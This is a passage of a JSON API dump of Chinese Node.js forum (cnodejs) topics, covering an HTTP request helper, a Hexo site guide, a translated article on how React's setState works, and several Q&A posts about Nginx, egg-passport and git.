{\n\t\t\tcb(err,null);\n\t\t});\n\t});\n\treq.write(params);\n\treq.end();\n};\n\n&#x2F;&#x2F;以下测试请解开在运行，都是相同的效果啦^_^\n&#x2F;&#x2F;_commitHttpReq({url:&quot;http:&#x2F;&#x2F;www.baidu.com&#x2F;s?wd=nba&quot;,protocol:&quot;http&quot;},function(err,reply){console.log(reply);});\n&#x2F;&#x2F;_commitHttpReq({url:&quot;http:&#x2F;&#x2F;www.baidu.com&#x2F;s?wd=nba&quot;},function(err,reply){console.log(reply);});\n&#x2F;&#x2F;_commitHttpReq({url:&quot;www.baidu.com&#x2F;s?wd=nba&quot;,protocol:&quot;http&quot;},function(err,reply){console.log(reply);});\n&#x2F;&#x2F;_commitHttpReq({url:&quot;http:&#x2F;&#x2F;www.baidu.com&#x2F;s&quot;,protocol:&quot;http&quot;,data:{wd:&quot;nba&quot;}},function(err,reply){console.log(reply);});\n&#x2F;&#x2F;_commitHttpReq({url:&quot;http:&#x2F;&#x2F;www.baidu.com&#x2F;s&quot;,protocol:&quot;http&quot;,data:{wd:&quot;nba&quot;},method:&quot;get&quot;},function(err,reply){console.log(reply);});\n\n&#x2F;&#x2F;如果是手机游戏发起http请求，通常后端开发自己写完接口后，调用一下：【这一段仅仅是demo，解开也没用哦，嘿嘿】\n&#x2F;&#x2F;_commitHttpReq({\n&#x2F;&#x2F;\thost: &quot;192.168.1.126&quot;,\n&#x2F;&#x2F;\tport: 2000,\n&#x2F;&#x2F;\tprotocol: &quot;http&quot;,\n&#x2F;&#x2F;\tpath: &quot;&#x2F;callMethod.do&quot;,\n&#x2F;&#x2F;\tmethod: &quot;post&quot;,\n&#x2F;&#x2F;\tdata: {to_server: JSON.stringify({uid:11,x:22,y:33,soldiers:[&quot;s1&quot;,&quot;s3&quot;]})}\n&#x2F;&#x2F;}, function (err, reply) {\n&#x2F;&#x2F;\tconsole.log(err);\n&#x2F;&#x2F;\tconsole.log(reply);\n&#x2F;&#x2F;});\n</code></pre></div>","title":"自己封装的一个http请求,纯分享，无它耳","last_reply_at":"2019-01-10T14:13:30.900Z","good":false,"top":false,"reply_count":12,"visit_count":7348,"create_at":"2015-05-14T10:14:50.550Z","author":{"loginname":"fantasticsoul","avatar_url":"https://avatars0.githubusercontent.com/u/7334950?v=4&s=120"}},{"id":"58e469c127d4e1302010664f","author_id":"56ad78ea24b0c1ec628ff0e2","tab":"share","content":"<div class=\"markdown-text\"><h2>你的项目需要一个官网平台了—基于Hexo快速搭建项目官网及文档平台</h2>\n<p>玩过 <code>github.io</code> 的同学对 <a href=\"https://hexo.io/\">hexo</a> 都比较熟悉，目前最火的静态博客工具。其实，<code>hexo</code> 除了能帮助我们快速搭建个人博客，还能快捷搭建 <code>项目官网</code>。最近在搭建公司内部框架的官网用到了，跟大家一块分享下~</p>\n<p>项目直达：<a href=\"https://github.com/younth/hexo-site-kit\">基于Hexo快速搭建项目官网及文档平台</a></p>\n<h3>项目官网的构成</h3>\n<p>我们先来看看一些项目的官网：</p>\n<h4>1. Hexo 官网</h4>\n<p><a href=\"https://hexo.io/\">https://hexo.io/</a></p>\n<p>首页：</p>\n<p><img src=\"http://younth.coding.me/static/md/1491319000619.png\" alt=\"hexo-site-kit\"></p>\n<p>文档平台：</p>\n<p><img src=\"http://younth.coding.me/static/md/1491319190201.png\" alt=\"hexo-site-kit\"></p>\n<p>新闻页面：</p>\n<p><img src=\"http://younth.coding.me/static/md/1491319330458.png\" alt=\"hexo-site-kit\"></p>\n<h4>2. NexT 官网</h4>\n<p><a href=\"http://theme-next.iissnan.com/\">http://theme-next.iissnan.com/</a></p>\n<p>首页：</p>\n<p><img src=\"http://younth.coding.me/static/md/1491319389082.png\" alt=\"hexo-site-kit\"></p>\n<p>文档平台：</p>\n<p><img src=\"http://younth.coding.me/static/md/1491319427575.png\" alt=\"hexo-site-kit\"></p>\n<p>其他还有一些项目的官网都是这种形式的，我们可以看出，一般项目官网主要包括下面几个部分：</p>\n<ul>\n<li>首页</li>\n<li>文档页面</li>\n<li>独立页面</li>\n</ul>\n<p>那么如何快速的搭建这几个页面框架呢？</p>\n<h4>首页</h4>\n<p>一般来说，首页比较个性化，涉及到设计风格，有设计资源的同学可以找相关的同学帮助设计，然后编写成静态页面。如果没有设计资源，可以直接用网上现有的（注意版权），修改套用，文章后面我提供了两种笔者目前再用的。</p>\n<h4>文档页面</h4>\n<p>文档页面就类似于我们的博客平台，这是我们更新最频繁的地方。我们用 <code>markdown</code> 编写，然后通过 <code>hexo</code> 自动生成静态页面，配合文档样式框架，最终即可形成我们的文档平台。下面的截图是本人对 <code>egg</code> 官网的样式进行改造后：</p>\n<p><img src=\"http://younth.coding.me/static/md/1491320140696.png\" alt=\"hexo-site-kit\"></p>\n<p>这种文档平台有点类似于 <code>gitbook</code> 提供的编写文档能力。<code>gitbook</code> 只专门用于写文档或者书籍的，我们这个更灵活些~</p>\n<h4>独立页面</h4>\n<p>独立页面主要指我们的一些新闻页面，个性页面。这种页面一般分为两种：</p>\n<ul>\n<li>新闻、通用单页面：编写页面基础框架，剩余部分通过 <code>markdown</code> 编写，<code>hexo</code> 生成</li>\n<li>个性页面：类似与首页，需要单独编写维护</li>\n</ul>\n<p>比如，这是我们内部框架用到的通用介绍页面：</p>\n<p><img src=\"http://younth.coding.me/static/md/1491320561544.png\" alt=\"hexo-site-kit\"></p>\n<h3>如何利用Hexo搭建官网</h3>\n<p>其实搭建项目官网的过程，就是在<code>编写hexo主题</code>的过程。因此必须对<code>hexo</code>主题的构成及API有一定的了解。<a href=\"https://hexo.io/zh-cn/docs/themes.html\">传送门—hexo主题说明</a></p>\n<p>hexo 官方主题默认模板引擎是 <code>swig</code>。虽然该模板引擎目前停止维护了，但是不得不说非常好用。目前很多主题也是基于swig，这里也建议大家使用。</p>\n<p>下面是一个官网主题的目录结构：</p>\n<pre class=\"prettyprint language-bash\"><code>docs\n  ├─ languages &#x2F;&#x2F; 多语言翻译配置文件  \n  ├─ layout   &#x2F;&#x2F; 模板文件\n  │  ├─ layout.swig  &#x2F;&#x2F; 基础模板\n  │  ├─ index.swig  &#x2F;&#x2F; 首页\n  │  ├─ post.swig  &#x2F;&#x2F; 独立文章页面框架\n  │  └─ page.swig &#x2F;&#x2F; (文档平台框架)\n  ├─ scripts &#x2F;&#x2F; \n  │  └─ helper.js &#x2F;&#x2F; node执行的脚本，自定义辅助函数，一般用于提取导航信息，跳转等 \n  ├─ source &#x2F;&#x2F; 存放前端css js资源\n  ...\n</code></pre><p>编写主题需要基础的前端技能，建议大家通过hexo官网api或者网上成熟的开源主题进行二次开发来学习如何编写主题，其中需要主要的是：</p>\n<p><code>scripts/helper.js</code> 这个文件是hexo运行时候执行的，即在node环境下执行，功能是可以实现一些全局的功能函数，比如提取导航，生成链接等。</p>\n<h3>用 hexo-site-kit 快速搭建官网</h3>\n<p>这里本人近期基于 <code>egg</code> 、<code>hexo</code> 官网主题进行了二次开发，搞了一个项目 <a href=\"https://github.com/younth/hexo-site-kit\">hexo-site-kit</a> ，运行即可看到一个官网平台的demo。</p>\n<p>该项目不是一个hexo主题插件，而是一套迅速搭建你的官网平台解决方案。目前包含有两种主题样式 ，通过修改<code>_config.yml</code> 里面的 <code>theme</code>可以更改主题。</p>\n<ul>\n<li>docs: 基于 egg 官网改造</li>\n<li>navy: 基于 hexo 官网改造</li>\n</ul>\n<p><strong>切换主题的时候，务必先执行 <code>hexo clean</code> 清空之前的编译缓存</strong></p>\n<p>后续会继续搜寻开发出好用的官网及文档平台，更新到项目的theme下面，丰富主题供大家选择。</p>\n</div>","title":"你的项目需要一个官网平台了—基于Hexo快速搭建项目官网及文档平台","last_reply_at":"2019-01-10T11:48:25.833Z","good":false,"top":false,"reply_count":7,"visit_count":2450,"create_at":"2017-04-05T03:51:29.319Z","author":{"loginname":"younth","avatar_url":"https://avatars1.githubusercontent.com/u/8591147?v=4&s=120"}},{"id":"5c35d6413898674067a7d463","author_id":"596227071b534b4408190b56","tab":"ask","content":"<div class=\"markdown-text\"><p>前辈们好，快有半年没上cnode了，这个社区对我来说挺温暖的说 :)\n最近在方向的选择上又陷入了迷茫（我承认人生很纠结，也承认我“三天热度”的臭毛病，为此还牺牲了不少……）</p>\n<p>是这样的，我目前是大四的学生，大三的时候在京东的node团队后端实习了一年，收获了挺多东西的。\n但是出于某种原因，我离职了，去到了其他地方实习，但发现那边不太适合我，而且这届互联网形势很差大家也知道，hc卡的很紧，我也担心自己不能转正，刚好学校有保研的机会（某211），我就回到学校选了人工智能方向。（当时是出于兴趣）。\n学了几个月后，问题来了，我发现我对人工智能比较失望，也对自己比较失望。一方面是我自己的数学功底好像不是很好，可能在学习方法上也存在问题。另一方面我发现现在的人工智能泡沫真的很大，算法岗供过于求，竞争激烈，且我们实验室大部分人做实验只是简单的clone代码、炼丹、看看论文、做做ppt汇报。我个人感觉这样学三年很难学出个什么东西来，不够顶尖，加上算法岗不好进，更别提去大厂了。\n我就想，与其花三年的时间学个飘在天上的人工智能，倒不如花三年学习前端，加上自己对前端也比较感兴趣（当初一直说想转前端）、有着一年工作经验的node功底。做一个“大前端”也是不错的选择。</p>\n<p>说实话当初选人工智能是看在薪资高、高大上、不是搬砖的（我承认我当时非常肤浅），但是现在我觉得我想错了。\n所以问题是：在读研人工智能的三年内，我将精力放在大前端的学习上，毕业后做Node工程师相关方面的工作。还是继续人工智能方向的学习，毕业后混个差不多的人工智能职位呢？（学人工智能能进大厂我十分没信心）</p>\n<p>谢谢各位前辈！</p>\n</div>","title":"请教：转行大前端的一些问题，请教前辈们","last_reply_at":"2019-01-10T11:32:46.615Z","good":false,"top":false,"reply_count":8,"visit_count":939,"create_at":"2019-01-09T11:08:49.049Z","author":{"loginname":"Bingmang","avatar_url":"https://avatars0.githubusercontent.com/u/19223221?v=4&s=120"}},{"id":"5c2ee2655bf06c5e7e3f11e9","author_id":"5ab852d6320bb09d69e231f1","tab":"ask","content":"<div class=\"markdown-text\"><p>问题描述:下面是一段node.js连接redis的代码,服务端和redis分别在2个服务器上,服务器启动,代码是正常的,点击指定测试连接能进入到下面的蓝色箭头所指代码,并提示连接redis服务器成功.这时候我把redis服务器断开连接(模拟redis服务器意外关闭),这时候在点击测试连接就提示Can’t set headers after they are sent,不是应该直接返回红色箭头所指的json数据么?对了 用await写就没问题,是不是回调的问题啊?出于某些原因,这里不能用await\n\t<img src=\"//static.cnodejs.org/FguvsmrZNLInnB25o1_8i_yfk9-0\" alt=\"2222.jpg\">\n\t###\n\t<img src=\"//static.cnodejs.org/Fud1YsunJ_aA1I7CuewDTaA6lRPM\" alt=\"1111.jpg\"></p>\n</div>","title":"(已解决)Can't set headers after they are sent为什么会出现啊","last_reply_at":"2019-01-10T08:37:07.465Z","good":false,"top":false,"reply_count":7,"visit_count":891,"create_at":"2019-01-04T04:34:45.340Z","author":{"loginname":"iori2882","avatar_url":"https://avatars3.githubusercontent.com/u/1480587?v=4&s=120"}},{"id":"5c35c05a5bf06c5e7e3f34d3","author_id":"5c35b7123898674067a7d349","tab":"ask","content":"<div class=\"markdown-text\"><p>小白刚学egg，想完成本地持久化登陆：\n用户名密码登陆 ：登陆请求 -&gt; 校验用户名密码（通过）-&gt;把用户_id 加密写入cookies-&gt;登陆成功\n利用session登陆：获取资源请求-&gt;从cookies中获取用户_id（如果有），解密，验证（通过）-&gt;验证成功\n以上我理解session登陆过程，使用egg-passport-local来完成</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;app.js\n\n&#x27;use strict&#x27;;\nmodule.exports = app =&gt; {\n  app.passport.verify(async (ctx, user) =&gt; {\n    console.log(&#x27;verify&#x27;);\n    console.log(user);\n    return user;\n  });\n\n  &#x2F;&#x2F; 将用户信息序列化后存进 session 里面，一般需要精简，只保存个别字段\n  app.passport.serializeUser(async (ctx, user) =&gt; {\n    console.log(&#x27;serializeUser&#x27;);\n  });\n\n  &#x2F;&#x2F; 反序列化后把用户信息从 session 中取出来，反查数据库拿到完整信息\n  app.passport.deserializeUser(async (ctx, user) =&gt; {\n    console.log(&#x27;deserializeUser&#x27;);\n  });\n\n}; \n\n</code></pre><pre class=\"prettyprint\"><code>&#x2F;app&#x2F;router.js\n\nmodule.exports = app =&gt; {\n  const { router, controller } = app;\n  router.get(&#x27;&#x2F;&#x27;, controller.home.index);\n\n  const localStrategy = app.passport.authenticate(&#x27;local&#x27;);\n  router.post(&#x27;&#x2F;login&#x27;, localStrategy);\n};\n\n</code></pre><p>=========</p>\n<pre class=\"prettyprint\"><code>&#x2F;app&#x2F;controller&#x2F;home.js\n\n \t async index() {\n    if (await this.ctx.isAuthenticated()) {\n      this.ctx.body = &#x27;hi, egg&#x27;;\n    } else {\n      this.ctx.body = &#x27;not Authenticated !&#x27;;\n    }\n  }\n</code></pre><p>用户名密码登陆是成功的，登陆完毕后调用serializeUser，\n但是想请求需要登陆资源，<strong>为什么没有调用deserializeUser</strong>\n还是我流程弄错？<a href=\"https://stackoverflow.com/questions/11277779/passportjs-deserializeuser-never-called\">Stackoverflow同类问题</a>\n另外为什么<a href=\"https://github.com/eggjs/egg-passport-local\">egg-passport-local</a>  issues区被关闭了</p>\n</div>","title":"求助，egg-passport-local中没有调用deserializeUser","last_reply_at":"2019-01-10T07:54:16.079Z","good":false,"top":false,"reply_count":1,"visit_count":574,"create_at":"2019-01-09T09:35:22.653Z","author":{"loginname":"Robinsir","avatar_url":"https://avatars3.githubusercontent.com/u/18422742?v=4&s=120"}},{"id":"5c36eb483898674067a7d91c","author_id":"5b232f6429e6e510415b2aff","tab":"ask","content":"<div class=\"markdown-text\"><p>访问 localhost/apis/ 404。\nNginx 配置</p>\n<pre class=\"prettyprint\"><code>server {\n    listen       80;  #监听80端口\n    server_name  localhost; #当前服务的域名\n\n    #charset koi8-r;\n\n    #access_log  logs&#x2F;host.access.log  main;\n\n    location &#x2F; {\n        root   html;\n        index  index.html index.htm;\n    }\n\t\n\tlocation &#x2F;apis&#x2F; {\t\t\t\n        proxy_pass https:&#x2F;&#x2F;www.baidu.com&#x2F;;\n    }\n</code></pre><p>}</p>\n</div>","title":"Nginx 反向代理失败，求解答","last_reply_at":"2019-01-10T06:50:48.250Z","good":false,"top":false,"reply_count":0,"visit_count":574,"create_at":"2019-01-10T06:50:48.250Z","author":{"loginname":"chinahsj","avatar_url":"https://avatars0.githubusercontent.com/u/36189354?v=4&s=120"}},{"id":"5c36aa785bf06c5e7e3f384d","author_id":"56f3854c0a5a2cfb3ad149e2","tab":"ask","content":"<div class=\"markdown-text\"><p>之前在App Store上下载过一个叫AnyLink的VPN软件用来设置HTTP代理，方便把手机上的请求代理的PC上的抓包调试代理，最近一段时间这类软件突然间在App Store上下架了，不过据说是一部分会改头换面继续发布在App Store上，找了半天没找到合适的，想问下大家有没有类似App推荐？\n<img src=\"https://user-images.githubusercontent.com/11450939/50941324-665a1700-14bf-11e9-91a0-0ca939f77aab.jpg\" alt=\"用AnyLink设置HTTP代理\"></p>\n</div>","title":"App Store上有没有类似的App推荐？","last_reply_at":"2019-01-10T02:14:16.200Z","good":false,"top":false,"reply_count":0,"visit_count":576,"create_at":"2019-01-10T02:14:16.200Z","author":{"loginname":"avwo","avatar_url":"https://avatars2.githubusercontent.com/u/11450939?v=4&s=120"}},{"id":"5c35b5343898674067a7d33d","author_id":"58f837a3bbaf2f3f569be082","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文翻译自：<a href=\"https://overreacted.io/how-does-setstate-know-what-to-do/\">How Does setState Know What to Do?</a></p>\n<p>原作者：<a href=\"https://mobile.twitter.com/dan_abramov\">Dan Abramov</a></p>\n<p>如果有任何版权问题，请联系<a href=\"mailto:shuirong1997@icloud.com\">shuirong1997@icloud.com</a></p>\n</blockquote>\n<p>当你在组件中调用<code>setState</code>时，你觉得会发生什么？</p>\n<pre class=\"prettyprint language-react\"><code>import React from &#x27;react&#x27;;\nimport ReactDOM from &#x27;react-dom&#x27;;\n\nclass Button extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { clicked: false };\n    this.handleClick = this.handleClick.bind(this);\n  }\n  handleClick() {\n    this.setState({ clicked: true });\n  }\n  render() {\n    if (this.state.clicked) {\n      return &lt;h1&gt;Thanks&lt;&#x2F;h1&gt;;\n    }\n    return (\n      &lt;button onClick={this.handleClick}&gt;\n        Click me!\n      &lt;&#x2F;button&gt;\n    );\n  }\n}\n\nReactDOM.render(&lt;Button &#x2F;&gt;, document.getElementById(&#x27;container&#x27;));\n</code></pre><p>当然，React会用<code>{ clicked: true}</code> 这条状态重新渲染组件并且更新匹配到的DOM，然后返回<code>&lt;h1&gt;Thanks&lt;/h1&gt;</code>元素。</p>\n<p>听起来似乎简洁明了。但别急，React（或者说React DOM）是怎么做的？</p>\n<p>更新DOM听起来像是React DOM的事儿，但别忘了我们调用的可是<code>this.setState()</code>，它是React的东西，可不是React DOM的。另外，我们的基类<code>React.Component</code>是被定义在React内部。</p>\n<p>所以问题来了：<code>React.Component</code>内部的<code>setState</code>怎么能去更新DOM呢？</p>\n<p><strong>事先声明：就像我的<a href=\"https://overreacted.io/how-does-react-tell-a-class-from-a-function/\">其他博客</a>，你不需要熟练掌握React。这篇博客是为那些想要看看面纱之后是什么东西的人准备的。完全可选！</strong></p>\n<hr>\n<p>我们或许会认为<code>React.Component</code>类已经包含了DOM更新逻辑。</p>\n<p>但如果这是事实，那<code>this.setState</code>是如何工作在其他环境中呢？比如：在React Native App中的组件也能继承<code>React.Component</code>，他们也能像上面一样调用<code>this.setState()</code>，并且React Native工作在Android和iOS的原生视图而不是DOM中。</p>\n<p>你可能也对React Test Renderer 或 Shallow Renderer比较熟悉。这两个测试渲染器让你可以渲染一般的组件并且也能在他们中调用<code>this.setState</code>，但他们可都不使用DOM。</p>\n<p>如果你之前使用过一些渲染器比如说<a href=\"https://github.com/facebook/react/tree/master/packages/react-art\">React ART</a>，你可能知道在页面中使用超过一个渲染器是没什么问题的。（比如：ART组件工作在React DOM  树的内部。）这会产生一个不可维持的全局标志或变量。</p>\n<p><strong>所以<code>React.Component</code>以某种方式将state的更新委托为具体的平台（译者注：比如Android, iOS）</strong>，在我们理解这是如何发生之前，让我们对包是如何被分离和其原因挖得更深一点吧！</p>\n<hr>\n<p>这有一个常见的错误理解：React &quot;引擎&quot;在<code>react</code>包的内部。这不是事实。</p>\n<p>事实上，从 <a href=\"https://reactjs.org/blog/2015/07/03/react-v0.14-beta-1.html#two-packages\">React 0.14</a>开始对包进行分割时，<code>React</code>包就有意地仅导出关于如何定义组件的API了。React的大部分实现其实在“渲染器”中。</p>\n<p>渲染器的其中一些例子包括：<code>react-dom</code>,<code>react-dom/server</code>,<code>react-native</code>,<code>react-test-renderer</code>,<code>react-art</code>（另外，你也可以<a href=\"https://github.com/facebook/react/blob/master/packages/react-reconciler/README.md#practical-examples\">构建自己的</a>）。</p>\n<p>这就是为什么<code>react</code>包帮助很大而不管作用在什么平台上。所有它导出的模块，比如<code>React.Component</code>，<code>React.createElement</code>，<code>React.Children</code>和<code>[Hooks](https://reactjs.org/docs/hooks-intro.html)</code>，都是平台无关的。无论你的代码运行在React DOM、React DOM Server、还是React Native，你的组件都可以以一种相同的方式导入并且使用它们。</p>\n<p>与之相对的是，渲染器会暴露出平台相关的接口，比如<code>ReactDOM.render()</code>，它会让你可以把React挂载在DOM节点中。每个渲染器都提供像这样的接口，但理想情况是：大多数组件都不需要从渲染器中导入任何东西。这能使它们更精简。</p>\n<p><strong>大多数人都认为React“引擎”是位于每个独立的渲染器中的</strong>。许多渲染器都包含一份相同的代码—我们叫它<a href=\"https://github.com/facebook/react/tree/master/packages/react-reconciler\">“调节器”</a>，为了表现的更好，遵循<a href=\"https://reactjs.org/blog/2017/12/15/improving-the-repository-infrastructure.html#migrating-to-google-closure-compiler\">这个步骤</a> 可以让调节器的代码和渲染器的代码在打包时归到一处。（拷贝代码通常不是优化“打包后文件”（bundle）体积的好办法，但大多数React的使用者一次只需要一个渲染器，比如：<code>react-dom</code>（译者注：因此可以忽略调节器的存在））</p>\n<p>The takeaway here 是<code>react</code>包仅仅让你知道如何使用React的特性而无需了解他们是如何被实现的。渲染器（<code>react-dom,react-native</code>等等）会提供React特性的实现和平台相关的逻辑；一些关于调节器的代码被分享出来了，但那只是单独渲染器的实现细节而已。</p>\n<hr>\n<p>现在我们知道了为什么<code>react</code>和<code>react-dom</code>包需要为新特定更新代码了。比如：当React16.3新增了Context接口时，<code>React.createContext()</code>方法会在React包中被暴露出来。</p>\n<p>但是<code>React.createContext()</code>实际上不会实现具体的逻辑（译者注：只定义接口，由其他渲染器来实现逻辑）。并且，在React DOM和React DOM Server上实现的逻辑也会有区别。所以<code>createContext()</code>会返回一些纯粹的对象（定义如何实现）：</p>\n<pre class=\"prettyprint language-react\"><code>&#x2F;&#x2F; 一个简单例子\nfunction createContext(defaultValue) {\n  let context = {\n    _currentValue: defaultValue,\n    Provider: null,\n    Consumer: null\n  };\n  context.Provider = {\n    $$typeof: Symbol.for(&#x27;react.provider&#x27;),\n    _context: context\n  };\n  context.Consumer = {\n    $$typeof: Symbol.for(&#x27;react.context&#x27;),\n    _context: context,\n  };\n  return context;\n}\n</code></pre><p>你会在某处代码中使用<code>&lt;MyContext.Provider&gt;</code>或<code>&lt;MyContext.Consumer</code>&gt;，那里就是决定着如何处理他们的渲染器。React DOM会用A方法追踪context值，但React DOM Server或许会用另一个不同的方法实现。</p>\n<p><strong>所以如果你将<code>react</code>升级到16.3+，但没有升级react-dom，你将使用一个还不知道<code>Provider</code>和<code>Consumer</code>类型的渲染器</strong>，这也就旧版的<code>react-dom</code>可能会<a href=\"https://stackoverflow.com/a/49677020/458193\">报错：fail saying these types are invalid</a>的原因。</p>\n<p>同样的警告也会出现在React Native中，但是不同于React DOM，一个新的React版本不会立即产生一个对应的React Native版本。他们（React Native）有自己的发布时间表。大概几周后，渲染器代码才会<a href=\"https://github.com/facebook/react-native/commits/master/Libraries/Renderer/oss\">单独更新</a>到React Native库中。这就是为什么新特性在React Native生效的时间会和React DOM不同。</p>\n<hr>\n<p>Okay，那么现在我们知道了<code>react</code>包不包含任何好玩的东西，并且具体的实现都在像<code>react-dom</code>，<code>react-native</code>这样的渲染器中。但这并不能回答我们开头提出的问题。<code>React.Component</code>里的<code>setState()</code>是如何和对应的渲染器通信的呢？</p>\n<p><strong>答案是每个渲染器都会在创建的类中添加一个特殊的东西</strong>，这个东西叫<code>updater</code>。它不是你添加的东西—恰恰相反，它是React DOM，React DOM Server 或者React Native在创建了一个类的实例后添加的：</p>\n<pre class=\"prettyprint language-react\"><code>&#x2F;&#x2F; React DOM 中是这样\nconst inst = new YourComponent();\ninst.props = props;\ninst.updater = ReactDOMUpdater;\n&#x2F;&#x2F; React DOM Server 中是这样\nconst inst = new YourComponent();\ninst.props = props;\ninst.updater = ReactDOMServerUpdater;\n&#x2F;&#x2F; React Native 中是这样\nconst inst = new YourComponent();\ninst.props = props;\ninst.updater = ReactNativeUpdater;\n</code></pre><p>从 <a href=\"https://github.com/facebook/react/blob/ce43a8cd07c355647922480977b46713bd51883e/packages/react/src/ReactBaseClasses.js#L58-L67\"><code>setState</code>的实现</a>就可以看出，它做的所有的工作就是把任务委托给在这个组件实例中创建的渲染器：</p>\n<pre class=\"prettyprint language-react\"><code>&#x2F;&#x2F; 简单例子\nsetState(partialState, callback) {\n  &#x2F;&#x2F; 使用&#96;updater&#96;去和渲染器通信\n  this.updater.enqueueSetState(this, partialState, callback);\n}\n</code></pre><p>React DOM Server <a href=\"https://github.com/facebook/react/blob/ce43a8cd07c355647922480977b46713bd51883e/packages/react-dom/src/server/ReactPartialRenderer.js#L442-L448\">可能想</a>忽略状态更新并且警告你，然而React DOM和React Native将会让调节器的拷贝部分去 <a href=\"https://github.com/facebook/react/blob/ce43a8cd07c355647922480977b46713bd51883e/packages/react-reconciler/src/ReactFiberClassComponent.js#L190-L207\">处理它</a>。</p>\n<p>这就是尽管<code>this.setState()</code>被定义在React包中也可以更新DOM的原因。它调用被React DOM添加的<code>this.updater</code>并且让React DOM来处理更新。</p>\n<hr>\n<p>现在我们都比较了解“类”了，但“钩子”（Hooks）呢？</p>\n<p>当人们第一次看到 <a href=\"https://reactjs.org/docs/hooks-intro.html\">钩子接口的提案</a>时，他们常回想：<code>useState</code>是怎么知道该做什么呢？这一假设简直比对<code>this.setState()</code>的疑问还要迷人。</p>\n<p>但就像我们如今看到的那样，<code>setState()</code>的实现一直以来都是模糊不清的。它除了传递调用给当前的渲染器外什么都不做。所以，<code>useState</code>钩子做的事也是如此。</p>\n<p>这次不是<code>updater</code>，钩子（Hooks）使用一个叫做“分配器”（dispatcher）的对象，当你调用<code>React.useState()</code>、<code>React.useEffect()</code>或者其他自带的钩子时，这些调用会被推送给当前的分配器。</p>\n<pre class=\"prettyprint language-react\"><code>&#x2F;&#x2F; In React (simplified a bit)\nconst React = {\n  &#x2F;&#x2F; Real property is hidden a bit deeper, see if you can find it!\n  __currentDispatcher: null,\n\n  useState(initialState) {\n    return React.__currentDispatcher.useState(initialState);\n  },\n\n  useEffect(initialState) {\n    return React.__currentDispatcher.useEffect(initialState);\n  },\n  &#x2F;&#x2F; ...\n};\n</code></pre><p>单独的渲染器会在渲染你的组件之前设置分配器（dispatcher）。</p>\n<pre class=\"prettyprint language-react\"><code>&#x2F;&#x2F; In React DOM\nconst prevDispatcher = React.__currentDispatcher;\nReact.__currentDispatcher = ReactDOMDispatcher;let result;\ntry {\n  result = YourComponent(props);\n} finally {\n  &#x2F;&#x2F; Restore it back  React.__currentDispatcher = prevDispatcher;}\n</code></pre><p>React DOM Server的实现在<a href=\"https://github.com/facebook/react/blob/ce43a8cd07c355647922480977b46713bd51883e/packages/react-dom/src/server/ReactPartialRendererHooks.js#L340-L354\">这里</a>。由React DOM和React Native共享的调节器实现在<a href=\"https://github.com/facebook/react/blob/ce43a8cd07c355647922480977b46713bd51883e/packages/react-reconciler/src/ReactFiberHooks.js\">这里</a>。</p>\n<p>这就是为什么像<code>react-dom</code>这样的渲染器需要访问和你调用的钩子所使用的<code>react</code>一样的包。否则你的组件将找不到分配器！如果你有<a href=\"https://github.com/facebook/react/issues/13991\">多个React的拷贝在相同的组件树中</a>，代码可能不会正常工作。然而，这总是造成复杂的Bug，因此钩子会在它耗光你的精力前强制你去解决包的副本问题。</p>\n<p>如果你不觉得这有什么，你可以在工具使用它们前精巧地覆盖掉原先的分配器（<code>__currentDispatcher</code>的名字其实我自己编的但你可以在React仓库中找到它真正的名字）。比如：React DevTools会使用一个<a href=\"https://github.com/facebook/react/blob/ce43a8cd07c355647922480977b46713bd51883e/packages/react-debug-tools/src/ReactDebugHooks.js#L203-L214\">特殊的内建分配器</a>来通过捕获JavaScript调用栈来反映（introspect）钩子。不要在家里重复这个（Don’t repeat this at home.）（译者注：可能是“不要在家里模仿某项实验”的衍生体。可能是个笑话，但我get到）</p>\n<p>这也意味着钩子不是React固有的东西。如果在将来有很多类库想要重用相同的基础钩子，理论上来说分配器可能会被移到分离的包中并且被塑造成优秀的接口—会有更少让人望而生畏的名称—暴露出来。在实际中，我们更偏向去避免过于仓促地将某物抽象，直到我们的确需要这么做。</p>\n<p><code>updater</code>和<code>__currentDispatcher</code>都是泛型程序设计（<em>依赖注入</em>/<em>dependency injection</em>）的绝佳实例。渲染器“注入”特性的实现。就像<code>setState</code>可以让你的组件看起来简单明了。</p>\n<p>当你使用React时，你不需要考虑它是如何工作的。我们期望React用户去花费更多的时间去考虑它们的应用代码而不是一些抽象的概念比如：依赖注入。但如果你曾好奇<code>this.setState()</code>或<code>useState()</code>是怎么知道它们该做什么的，那我希望这篇文章将帮助到你。</p>\n</div>","title":"「译」setState如何知道它该做什么？","last_reply_at":"2019-01-09T08:47:48.018Z","good":false,"top":false,"reply_count":0,"visit_count":593,"create_at":"2019-01-09T08:47:48.018Z","author":{"loginname":"shuiRong","avatar_url":"https://avatars1.githubusercontent.com/u/16076993?v=4&s=120"}},{"id":"5c2ed51e3898674067a7b0af","author_id":"5c07a4e1d3b8ab334e8db215","tab":"share","content":"<div class=\"markdown-text\"><p>遇见未来——人类科技的极限在哪里\n<a href=\"https://www.youtube.com/watch?v=oncmJiCkn9g&amp;feature=youtu.be\">https://www.youtube.com/watch?v=oncmJiCkn9g&amp;feature=youtu.be</a>\n科技，改变了我们的生活。但也有人说，科技是统治者的工具。究竟如何定义科技？或许，这一次，科技将真正为大多数人的利益而战，这一次，我们将重新定义人类的未来。V-Dimension项目1月24日正式发布，敬请期待一个新的自由次元。\n<img src=\"//static.cnodejs.org/Fr9qoe_6b4Evnihi8nwayKZlcMwu\" alt=\"20DAY.png\"></p>\n</div>","title":"遇见未来——人类科技的极限在哪里","last_reply_at":"2019-01-09T08:33:46.969Z","good":false,"top":false,"reply_count":3,"visit_count":893,"create_at":"2019-01-04T03:38:06.140Z","author":{"loginname":"17085101460","avatar_url":"https://avatars3.githubusercontent.com/u/45624434?v=4&s=120"}},{"id":"5c356d215bf06c5e7e3f2ff9","author_id":"5735889dc3e4ef7657ab12f1","tab":"ask","content":"<div class=\"markdown-text\"><p>自己的一些笔记使用坚果云同步,linux windows多个平台, .git目录中的文件不希望实时同步,在每个终端下保存自己的一份,怎样将.git目录和源码目录分开保存?</p>\n</div>","title":"[已解决].git和源码设置在不同目录","last_reply_at":"2019-01-09T07:58:41.693Z","good":false,"top":false,"reply_count":2,"visit_count":600,"create_at":"2019-01-09T03:40:17.096Z","author":{"loginname":"vipzrx","avatar_url":"https://avatars1.githubusercontent.com/u/5094958?v=4&s=120"}},{"id":"5c3575435bf06c5e7e3f306a","author_id":"5c35745d3898674067a7cf64","tab":"ask","content":"<div 